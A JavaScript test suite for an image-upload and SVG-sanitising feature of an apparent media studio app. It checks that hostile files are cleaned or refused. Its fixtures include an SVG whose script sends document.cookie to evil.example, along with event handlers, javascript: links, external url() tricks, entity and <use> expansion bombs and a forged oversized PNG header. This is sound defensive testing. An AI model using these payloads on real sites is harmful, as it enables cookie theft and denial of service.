// Uploads: PNG, JPEG and SVG files become image assets; a hostile SVG is sanitised (or rejected);
// duplicates are found by content hash; a palette and a thumbnail are extracted; the agent's
// description takes an upload off the needs-description list and makes it findable by its tags;
// an SVG draws on through f.svg. Every test image is made here, never downloaded.

import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, readFileSync, readdirSync } from 'node:fs';
import { request } from 'node:http';
import { join } from 'node:path';
import { createCanvas, loadImage } from '../src/render/host.js';
import { sanitizeSvg, vectorModel, useExpansion, parseXml, SvgError } from '../src/studio/svg.js';
import { sniff, MAX_UPLOAD } from '../src/studio/uploads.js';
import { imageSize } from '../src/studio/library.js';
import { createStudioServer } from '../src/server/http.js';
import { tempStudio, AUTHOR } from './helpers.js';

const HOSTILE = `<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="100" viewBox="0 0 200 100" onload="alert(1)">
  <script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
  <style>@import url(https://evil.example/x.css); rect { fill: red }</style>
  <defs><linearGradient id="g"><stop offset="0" stop-color="#ffd166"/><stop offset="1" stop-color="#ff5c8a"/></linearGradient></defs>
  <rect id="box" x="10" y="10" width="180" height="80" rx="16" fill="url(#g)" onclick="steal()" style="stroke: #1b1f3b; stroke-width: 4; background: url(https://evil.example/track.png)"/>
  <use xlink:href="https://evil.example/sprite.svg#icon" x="0" y="0"/>
  <use href="#box" x="0" y="0" opacity="0.2"/>
  <image href="https://evil.example/pixel.png" width="10" height="10"/>
  <foreignObject width="100" height="100"><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example"></iframe></foreignObject>
  <a href="javascript:alert(2)"><circle cx="100" cy="50" r="20" fill="#1b1f3b"/></a>
  <animate attributeName="href" to="javascript:alert(3)"/>
</svg>`;

const LOGO = `<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120">
  <path d="M20 100 L60 20 L100 100 Z" fill="#7b5cff" stroke="#16121f" stroke-width="6" stroke-linejoin="round"/>
  <circle cx="60" cy="72" r="14" fill="#ffd166"/>
</svg>`;

let t, studio, server, base;
before(async () => {
  t = tempStudio();
  studio = t.studio;
  server = /** @type {any} */ (createStudioServer(studio, { env: { PATH: '' } }));
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  base = `http://127.0.0.1:${server.address().port}`;
});
after(async () => {
  server.closeAllConnections();
  await new Promise((resolve) => server.close(resolve));
  await t.cleanup();
});

/** A two-colour test picture: left 3/4 one colour, right 1/4 another. */
function picture(type = 'image/png', left = '#2a6f97', right = '#ffd166') {
  const c = createCanvas(160, 90);
  const g = c.getContext('2d');
  g.fillStyle = left; g.fillRect(0, 0, 120, 90);
  g.fillStyle = right; g.fillRect(120, 0, 40, 90);
  return c.toBuffer(/** @type {any} */ (type));
}

test('file types are read from the bytes', () => {
  assert.equal(sniff(picture()).kind, 'png');
  assert.equal(sniff(picture('image/jpeg')).kind, 'jpeg');
  assert.equal(sniff(picture('image/webp')).kind, 'webp');
  assert.equal(sniff(Buffer.from(LOGO)).kind, 'svg');
  assert.equal(sniff(Buffer.from(HOSTILE)).kind, 'svg');
  assert.equal(sniff(Buffer.from('GIF89a…')), null);
  assert.equal(sniff(Buffer.from('<html><svg></svg></html>')), null);
  assert.equal(sniff(Buffer.from(String.fromCharCode(0xfeff) + '  <?xml version="1.0"?>\n<!-- made by hand -->\n<!-- twice -->\n<svg xmlns="http://www.w3.org/2000/svg"/>')).kind, 'svg');
  assert.equal(sniff(Buffer.from('<!-- c --><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "x.dtd"><svg></svg>')).kind, 'svg', 'a DOCTYPE is the sanitiser\'s to refuse');
  assert.equal(sniff(Buffer.from('<!DOCTYPE html><html><svg></svg></html>')), null);
});

test('sniffing a file takes no time, whatever its prologue looks like', () => {
  // forty empty comments and then not an SVG: a regex with a repeated comment group never came back from this
  const t0 = performance.now();
  assert.equal(sniff(Buffer.from(`${'<!---->'.repeat(40)}<x/>`)), null);
  assert.equal(sniff(Buffer.from(`${'<!---->'.repeat(40)}<svg></svg>`)).kind, 'svg');
  assert.equal(sniff(Buffer.from(`<?xml version="1.0"?>${'<!-- -->\n'.repeat(400)}<x/>`)), null);
  assert.equal(sniff(Buffer.from('<!--'.repeat(1000))), null);
  assert.ok(performance.now() - t0 < 500, `took ${Math.round(performance.now() - t0)} ms`);
});

test('a hostile SVG is sanitised: no script, handlers, external references, foreignObject, style or animation survive', async () => {
  const { svg, removed, tree } = sanitizeSvg(HOSTILE);
  for (const bad of [/<script/i, /onload/i, /onclick/i, /evil\.example/, /<foreignObject/i, /<iframe/i, /<style/i, /@import/, /javascript:/i, /<image/i, /<animate/i, /<a[\s>]/]) {
    assert.doesNotMatch(svg, bad, `${bad} is gone`);
  }
  assert.match(svg, /<rect id="box"[^>]*fill="url\(#g\)"[^>]*style="stroke: #1b1f3b; stroke-width: 4"/, 'safe drawing and a local gradient reference stay');
  assert.match(svg, /<use href="#box"/, 'a local <use> stays');
  assert.match(svg, /<circle cx="100"/, 'the contents of the link stay');
  for (const what of ['event handler onload on <svg>', '<script>', '<style>', 'external xlink:href on <use>', '<image>', '<foreignObject>', '<a> (its contents kept)', '<animate>', 'event handler onclick on <rect>', 'style property "background" on <rect>']) {
    assert.ok(removed.includes(what), `reports: ${what} (got ${removed.join(' | ')})`);
  }
  const model = vectorModel(tree);
  assert.equal(model.paths.length, 3, 'the rect, the <use> copy and the circle');
  assert.equal(model.paths[0].fill, '#ffd166', 'a gradient fill becomes its first stop');
  const img = await loadImage(Buffer.from(svg));
  const c = createCanvas(200, 100);
  c.getContext('2d').drawImage(img, 0, 0);
  assert.equal(c.getContext('2d').getImageData(100, 50, 1, 1).data[3], 255, 'the sanitised SVG still draws');
});

test('a url() that is not a plain reference inside the file never survives, however it is written', () => {
  const hostile = `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">
    <defs><linearGradient id="g"><stop offset="0" stop-color="rgb(255, 0, 0)"/></linearGradient></defs>
    <rect id="unclosed" width="1" height="1" style="fill:url(http://attacker.example/t.svg#g"/>
    <rect id="relative" width="1" height="1" fill="url(//attacker.example/x"/>
    <rect id="escaped" width="1" height="1" fill="u\\72l(http://attacker.example/e.svg#g)"/>
    <rect id="escaped-style" width="1" height="1" style="fill: u\\72l(http://attacker.example/e.svg#g); stroke: #000"/>
    <rect id="set" width="1" height="1" style="fill: image-set('http://attacker.example/i.png' 1x)"/>
    <rect id="spaced" width="1" height="1" fill="url (http://attacker.example/s.svg#g)"/>
    <rect id="second" width="1" height="1" fill="url(#g) url(http://attacker.example/2.svg#g)"/>
    <rect id="mask" width="1" height="1" mask="url( 'http://attacker.example/m.svg#m' )"/>
    <rect id="filter" width="1" height="1" filter="url(#g) drop-shadow(0 0 2px red)"/>
    <rect id="fine" width="1" height="1" fill="url( '#g' )" stroke="rgba(0, 0, 0, 0.5)" transform="translate(2 3) rotate(45)" style="stroke-width: 2; fill: hsl(10, 50%, 50%)"/>
    <rect id="shift" width="1" height="1" fill="translate(1 2)"/>
  </svg>`;
  const { svg, removed } = sanitizeSvg(hostile);
  assert.doesNotMatch(svg, /attacker\.example|image-set|\\|drop-shadow/);
  assert.doesNotMatch(svg, /url\((?!#g\)|\s*'#g'\s*\))/, 'only the local reference is left');
  assert.match(svg, /<rect id="fine" width="1" height="1" fill="url\( '#g' \)" stroke="rgba\(0, 0, 0, 0\.5\)" transform="translate\(2 3\) rotate\(45\)" style="stroke-width: 2; fill: hsl\(10, 50%, 50%\)"\/>/, 'local references, colours and transforms stay');
  assert.match(svg, /<rect id="escaped-style" width="1" height="1" style="stroke: #000"\/>/, 'the rest of a style stays');
  assert.match(svg, /stop-color="rgb\(255, 0, 0\)"/);
  for (const what of ['style property "fill" on <rect>', 'external url() in fill on <rect>', 'an escape in fill on <rect>', 'external url() in mask on <rect>', 'drop-shadow() in filter on <rect>', 'translate() in fill on <rect>']) {
    assert.ok(removed.includes(what), `reports: ${what} (got ${removed.join(' | ')})`);
  }
});

test('SVGs that cannot be accepted are rejected with the reason', () => {
  assert.throws(() => sanitizeSvg('<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x "xxxxxxxx">]><svg>&x;</svg>'), (e) => e instanceof SvgError && /DOCTYPE or entity/.test(e.message));
  assert.throws(() => sanitizeSvg('<svg><text>&nbsp;</text></svg>'), /unknown entity &nbsp;/);
  assert.throws(() => sanitizeSvg('<html><body/></html>'), /root element must be <svg>/);
  assert.throws(() => sanitizeSvg('<svg><g></svg>'), /does not close/);
  assert.throws(() => sanitizeSvg('<svg width=100></svg>'), /bad attribute/);
  assert.throws(() => sanitizeSvg('<?php echo 1 ?><svg/>'), /processing instructions/);
  assert.equal(parseXml('<svg><title>A &amp; B</title></svg>').children[0].children[0].children[0].text, 'A & B');
});

test('uploads become image assets with size, palette and thumbnail, on the needs-description list; duplicates are found by hash', async () => {
  const png = await studio.uploads.upload({ name: 'Harbour at dusk.png', data: picture(), author: 'user' });
  assert.equal(png.duplicate, false);
  const a = png.asset;
  assert.equal(a.slug, 'harbour-at-dusk');
  assert.equal(a.title, 'Harbour at dusk');
  assert.equal(a.needsDescription, true);
  assert.deepEqual(a.tags, ['upload', 'photo']);
  assert.equal(a.meta.width, 160);
  assert.equal(a.meta.palette[0], '#2a6f97', 'the dominant colour first');
  assert.ok(a.meta.palette.includes('#ffd166'));
  assert.ok(a.thumb);
  const again = await studio.uploads.upload({ name: 'copy of harbour.png', data: picture(), author: 'user' });
  assert.equal(again.duplicate, true);
  assert.equal(again.asset.ref, 'harbour-at-dusk@1');
  const jpg = await studio.uploads.upload({ name: 'harbour.jpg', data: picture('image/jpeg', '#7cc576'), author: 'user' });
  assert.equal(jpg.asset.slug, 'harbour');
  assert.equal(jpg.asset.meta.format, 'jpeg');
  const svg = await studio.uploads.upload({ name: 'Hostile badge.svg', data: Buffer.from(HOSTILE), author: 'user' });
  assert.ok(svg.removed.includes('<script>'));
  assert.equal(svg.asset.meta.format, 'svg');
  assert.deepEqual(svg.asset.meta.natural, { width: 200, height: 100 });
  assert.equal(svg.asset.meta.width, 2048, 'rasterised large enough to scale down');
  const kept = readFileSync(join(t.dataDir, svg.asset.meta.sidecar), 'utf8');
  assert.doesNotMatch(kept, /script|evil|onload/i, 'what is stored is the sanitised SVG');
  await assert.rejects(studio.uploads.upload({ name: 'bomb.svg', data: Buffer.from('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">]><svg>&lol;</svg>'), author: 'user' }), /The SVG was rejected: a DOCTYPE/);
  await assert.rejects(studio.uploads.upload({ name: 'notes.txt', data: Buffer.from('hello'), author: 'user' }), /not a PNG, JPEG, WebP or SVG/);
  assert.deepEqual(studio.uploads.undescribed().map((x) => x.slug), ['harbour-at-dusk', 'harbour', 'hostile-badge']);
});

/** `levels` groups, each referring to the one below `fan` times: fan^levels copies of the leaf once expanded. */
function nestedUse(levels, fan, leaf) {
  let s = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100"><defs>';
  s += `<g id="l0">${leaf}</g>`;
  for (let i = 1; i <= levels; i++) s += `<g id="l${i}">${`<use xlink:href="#l${i - 1}"/>`.repeat(fan)}</g>`;
  return `${s}</defs><use xlink:href="#l${levels}"/></svg>`;
}
const zigzag = (n) => `M0 0${'l1 1l-1 0'.repeat(n / 2)}`;

test('<use> cannot multiply the work: a drawing over budget has no vector model, a bomb is refused before it is rasterised', async () => {
  const t0 = performance.now();
  // twelve levels of ten references and nothing to draw at the bottom: 10^12 visits if every one is followed
  const empty = nestedUse(12, 10, '');
  assert.equal(useExpansion(sanitizeSvg(empty).tree).nodes > 1e12, true);
  assert.deepEqual(vectorModel(sanitizeSvg(empty).tree).paths, []);
  assert.equal(vectorModel(sanitizeSvg(empty).tree).over, true);
  await assert.rejects(studio.uploads.upload({ name: 'bomb.svg', data: Buffer.from(empty), author: 'user' }), (/** @type {any} */ e) => e.code === 'rejected' && /<use> references repeat too much/.test(e.message));
  // one long path drawn 4000 times: parsed once, and far too much to draw
  const many = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100"><defs><path id="p" d="${zigzag(20000)}"/></defs>${'<use xlink:href="#p"/>'.repeat(4000)}</svg>`;
  assert.equal(useExpansion(sanitizeSvg(many).tree).commands, 4000 * 20001);
  assert.equal(vectorModel(sanitizeSvg(many).tree).over, true);
  await assert.rejects(studio.uploads.upload({ name: 'many.svg', data: Buffer.from(many), author: 'user' }), /<use> references repeat too much/);
  // references that go round in a circle draw nothing and end
  const loop = '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><g id="a"><use href="#b"/></g><g id="b"><use href="#a"/><rect width="1" height="1"/></g></svg>';
  assert.ok(useExpansion(sanitizeSvg(loop).tree).nodes < 20);
  assert.ok(vectorModel(sanitizeSvg(loop).tree).paths.length > 0);
  assert.ok(performance.now() - t0 < 3000, `took ${Math.round(performance.now() - t0)} ms`);
  // more than f.svg() will carry, but an ordinary picture for the rasteriser: stored, without a vector model
  const busy = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100"><defs><path id="p" d="${zigzag(400)}" stroke="#16121f" fill="none"/></defs>${'<use xlink:href="#p"/>'.repeat(1000)}</svg>`;
  const kept = await studio.uploads.upload({ name: 'busy.svg', data: Buffer.from(busy), author: 'user' });
  assert.equal(kept.asset.meta.vector, null);
  assert.equal(kept.asset.meta.width, 2048);
  // an ordinary drawing with a few references keeps its model
  assert.equal(vectorModel(sanitizeSvg(nestedUse(2, 3, '<rect width="5" height="5"/>')).tree).paths.length, 9);
});

/** The first bytes of a PNG that says it is width × height (nothing after the header). */
function pngHeader(width, height) {
  const b = Buffer.alloc(33);
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13]).copy(b);
  b.write('IHDR', 12, 'latin1');
  b.writeUInt32BE(width, 16);
  b.writeUInt32BE(height, 20);
  b[24] = 8; b[25] = 2;
  return b;
}

test('an image that declares more pixels than the studio decodes is refused from its header', async () => {
  assert.deepEqual(imageSize(picture()), { width: 160, height: 90 });
  assert.deepEqual(imageSize(picture('image/jpeg')), { width: 160, height: 90 });
  assert.deepEqual(imageSize(picture('image/webp')), { width: 160, height: 90 });
  assert.deepEqual(imageSize(Buffer.concat([Buffer.from('GIF89a'), Buffer.from([0x40, 0x01, 0xf0, 0x00])])), { width: 320, height: 240 });
  assert.equal(imageSize(Buffer.from('not an image at all, just text')), null);
  // a single-colour 50,000 × 50,000 PNG is a few megabytes on disk and ten gigabytes decoded
  const t0 = performance.now();
  await assert.rejects(studio.uploads.upload({ name: 'huge.png', data: pngHeader(50000, 50000), author: 'user' }), (/** @type {any} */ e) => e.code === 'rejected' && /"huge\.png" is 50000×50000 pixels; images are at most 16384 pixels a side and 64 megapixels/.test(e.message));
  await assert.rejects(studio.uploads.upload({ name: 'wide.png', data: pngHeader(20000, 10), author: 'user' }), /20000×10 pixels/);
  await assert.rejects(studio.uploads.upload({ name: 'area.png', data: pngHeader(9000, 9000), author: 'user' }), /9000×9000 pixels/);
  await assert.rejects(studio.library.addFileAsset({ slug: 'huge-import', type: 'image', data: pngHeader(50000, 50000), ext: '.png', description: 'A PNG header that declares a huge image.', author: AUTHOR }), /50000×50000 pixels/);
  assert.ok(performance.now() - t0 < 1000, 'refused without decoding');
  assert.equal(readdirSync(join(t.dataDir, 'files')).some((f) => f.includes('huge') || f.startsWith('.tmp-')), false, 'nothing was written');
  // within the limits the header is not the judge: a truncated file is still refused by the decoder
  await assert.rejects(studio.uploads.upload({ name: 'cut.png', data: pngHeader(100, 100), author: 'user' }), /could not be decoded/);
});

test('two uploads racing for one name: one is saved with its SVG, the other is told, and no file is lost or left behind', async () => {
  // both read "no such asset yet" before either has decoded its image, so both go for twin@1
  const results = await Promise.allSettled(['#ff0000', '#00ff00'].map((c) => studio.library.addFileAsset({
    slug: 'twin', type: 'image', data: picture('image/png', c), ext: '.png', description: 'One of two files saved under the same name at once.', author: 'user',
    sidecar: { ext: '.svg', data: Buffer.from(LOGO.replace('#ffd166', c)) },
  })));
  assert.deepEqual(results.map((r) => r.status).sort(), ['fulfilled', 'rejected']);
  assert.equal(/** @type {any} */ (results.find((r) => r.status === 'rejected')).reason.code, 'conflict');
  const won = /** @type {any} */ (results.find((r) => r.status === 'fulfilled')).value.asset;
  const colour = results[0].status === 'fulfilled' ? '#ff0000' : '#00ff00';
  assert.equal(won.meta.sidecar, 'files/twin@1.svg');
  assert.ok(readFileSync(join(t.dataDir, won.meta.sidecar), 'utf8').includes(colour), 'the SVG kept is the saved upload\'s own');
  assert.ok(existsSync(join(t.dataDir, won.file)) && existsSync(join(t.dataDir, won.thumb)));
  for (const dir of ['files', 'thumbs']) assert.deepEqual(readdirSync(join(t.dataDir, dir)).filter((f) => f.startsWith('.tmp-')), [], `no temp files left in ${dir}`);
});

test('the agent describes an upload; it leaves the list and search finds it by those tags', () => {
  const r = studio.uploads.describe({ slug: 'harbour-at-dusk', title: 'Harbour at dusk', description: 'A flat two-tone harbour scene: deep blue water and a warm yellow strip of sky.', tags: ['harbour', 'dusk', 'blue', 'background'], uses: ['full-frame background under titles', 'slow Ken Burns pan'], author: 'agent' });
  assert.equal(r.needsDescription, false);
  assert.deepEqual(r.tags, ['harbour', 'dusk', 'blue', 'background', 'upload']);
  assert.deepEqual(r.suggestedUses, ['full-frame background under titles', 'slow Ken Burns pan']);
  assert.equal(r.version, 1, 'no new version');
  assert.deepEqual(studio.library.search({ tags: ['harbour', 'dusk'] }).assets.map((a) => a.slug), ['harbour-at-dusk']);
  assert.ok(studio.library.search({ query: 'warm yellow sky' }).assets.some((a) => a.slug === 'harbour-at-dusk'));
  assert.equal(studio.library.search({ needsDescription: true }).assets.some((a) => a.slug === 'harbour-at-dusk'), false);
});

test('an uploaded SVG draws on and recolours through f.svg; images work as params of function assets', async () => {
  const logo = (await studio.uploads.upload({ name: 'logo.svg', data: Buffer.from(LOGO), author: 'user' })).asset;
  assert.equal(logo.meta.vector.paths.length, 2);
  await studio.library.createAsset({ slug: 'logo-draw', author: AUTHOR, source: `asset({
    description: 'Draws an SVG logo on, stroke first, then fills it; recolourable.',
    tags: ['logo', 'svg', 'test'],
    duration: 2,
    params: { logo: { type: 'image', default: '${logo.ref}' }, color: { type: 'color', default: '#7b5cff' } },
    render(f, p) { f.svg(p.logo).draw(f.ctx, { width: f.width, height: f.height, progress: f.progress, fill: p.color }); },
  });` });
  await studio.library.createAsset({ slug: 'ken-burns', author: AUTHOR, source: `asset({
    description: 'A slow push-in on a photo (Ken Burns), cropped to the frame.',
    tags: ['photo', 'test'],
    duration: 2,
    params: { photo: { type: 'image', default: 'harbour-at-dusk' }, zoom: { type: 'number', default: 0.3 } },
    render(f, p) {
      const img = f.image(p.photo);
      const k = Math.max(f.width / img.width, f.height / img.height) * (1 + p.zoom * f.progress);
      f.ctx.drawImage(img, (f.width - img.width * k) / 2, (f.height - img.height * k) / 2, img.width * k, img.height * k);
    },
  });` });
  const px = async (ref, t, params = {}) => {
    const r = await studio.assetFrame({ ref, t, params, width: 240, height: 240, background: '#000000' });
    const img = await loadImage(r.png);
    const c = createCanvas(240, 240);
    c.getContext('2d').drawImage(img, 0, 0);
    return (x, y) => [...c.getContext('2d').getImageData(x, y, 1, 1).data];
  };
  const start = await px('logo-draw', 0), end = await px('logo-draw', 1.95, { color: '#00ff00' });
  assert.deepEqual(start(120, 160).slice(0, 3), [0, 0, 0], 'nothing drawn at progress 0');
  const [r, g, b] = end(120, 160);
  assert.ok(g > 200 && r < 60 && b < 60, `recoloured fill at the end (${r},${g},${b})`);
  const kb = await px('ken-burns', 1);
  assert.deepEqual(kb(60, 120).slice(0, 3), [0x2a, 0x6f, 0x97], 'the photo param is drawn');
  await assert.rejects(studio.library.createAsset({ slug: 'svg-on-png', author: AUTHOR, source: `asset({ description: 'Calls f.svg on a raster image, which has no vector drawing.', tags: ['t'], params: { img: { type: 'image', default: 'harbour' } }, render(f, p) { f.svg(p.img); } });` }), /has no vector drawing/);
});

test('HTTP: one raw image per request; anything else is refused', async () => {
  const up = (body, type, extra = {}) => fetch(`${base}/api/uploads?name=${encodeURIComponent(extra.name ?? 'drop.png')}`, { method: 'POST', headers: { 'content-type': type, ...(extra.headers ?? {}) }, body });
  const ok = await up(picture('image/png', '#ff5c8a', '#16121f'), 'image/png', { name: 'pink.png' });
  assert.equal(ok.status, 200);
  const body = await ok.json();
  assert.equal(body.asset.slug, 'pink');
  assert.equal(body.duplicate, false);
  const svg = await up(LOGO.replace('#7b5cff', '#2dd4bf'), 'image/svg+xml', { name: 'teal logo.svg' });
  assert.equal((await svg.json()).asset.slug, 'teal-logo');
  assert.equal((await up('hello', 'text/plain')).status, 415);
  assert.equal((await up(JSON.stringify({ a: 1 }), 'application/json')).status, 415);
  assert.equal((await up(picture(), 'image/png', { headers: { origin: 'https://evil.example' } })).status, 403);
  const list = await (await fetch(`${base}/api/uploads`)).json();
  assert.ok(list.assets.some((a) => a.slug === 'pink'));
  assert.ok((await (await fetch(`${base}/api/assets?needsDescription=1`)).json()).assets.some((a) => a.slug === 'teal-logo'));
});

test('HTTP: a file over the limit is refused with the reason, not with a dropped connection', async () => {
  const before = (await (await fetch(`${base}/api/assets?limit=1`)).json()).total;
  const big = Buffer.alloc(MAX_UPLOAD + 1_000_000, 7);
  picture().copy(big);
  // with its length declared, as a browser sends a dropped file
  const res = await fetch(`${base}/api/uploads?name=big.png`, { method: 'POST', headers: { 'content-type': 'image/png' }, body: big });
  assert.equal(res.status, 413);
  assert.equal(res.headers.get('connection'), 'close');
  assert.deepEqual(await res.json(), { error: 'The file is larger than 25 MB', code: 'too_large' });
  // and streamed with no length (chunked): refused once the limit is passed, read to its end, then answered
  const chunked = await new Promise((resolve, reject) => {
    const req = request(`${base}/api/uploads?name=big.png`, { method: 'POST', headers: { 'content-type': 'image/png' } }, (r) => {
      let text = '';
      r.on('data', (d) => { text += d; });
      r.on('end', () => resolve({ status: r.statusCode, body: JSON.parse(text) }));
      r.on('error', reject);
    });
    req.on('error', reject);
    for (let i = 0; i < big.length; i += 1 << 20) req.write(big.subarray(i, i + (1 << 20)));
    req.end();
  });
  assert.deepEqual(chunked, { status: 413, body: { error: 'The file is larger than 25 MB', code: 'too_large' } });
  // a refusal that does not need the body (a type the studio does not take, another origin) reaches a client still sending 20 MB:
  // the connection is kept, so Node reads the rest of the body off the wire itself
  const gif = await fetch(`${base}/api/uploads?name=big.gif`, { method: 'POST', headers: { 'content-type': 'image/gif' }, body: big.subarray(0, 20_000_000) });
  assert.equal(gif.status, 415);
  assert.match((await gif.json()).error, /Upload one PNG, JPEG, WebP or SVG file/);
  const foreign = await fetch(`${base}/api/uploads?name=big.png`, { method: 'POST', headers: { 'content-type': 'image/png', origin: 'https://evil.example' }, body: big.subarray(0, 20_000_000) });
  assert.equal(foreign.status, 403);
  assert.match((await foreign.json()).error, /other origins/);
  // the JSON routes have their own limit, answered the same way
  const json = await fetch(`${base}/api/requests`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ scope: 'library', message: 'x'.repeat(9e6) }) });
  assert.equal(json.status, 413);
  assert.match((await json.json()).error, /larger than 8 MB/);
  assert.equal((await (await fetch(`${base}/api/assets?limit=1`)).json()).total, before, 'nothing was saved');
  assert.equal((await fetch(`${base}/api/status`)).status, 200, 'the server is still answering');
});
